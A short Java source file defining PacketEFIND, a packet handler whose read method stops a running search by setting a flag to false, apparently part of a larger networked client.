package com.redpois0n.packets;

import com.redpois0n.Search;

public class PacketEFIND extends Packet {

	@Override
	public void read(String line) throws Exception {
		Search.running = false;
	}

}
